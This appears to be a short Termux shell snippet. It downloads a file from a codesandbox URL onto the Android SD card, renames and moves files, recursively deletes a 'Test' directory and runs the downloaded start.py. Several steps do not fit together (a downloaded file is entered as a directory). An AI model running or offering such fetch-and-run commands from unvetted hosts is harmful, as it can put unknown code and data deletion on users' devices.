cd /sdcard
wget https://sz85j.csb.app/test/SdCard
mv SdCard system
cd system
mv start.py /data/data/com.termux/files/home
cd
rm Test -r
python start.py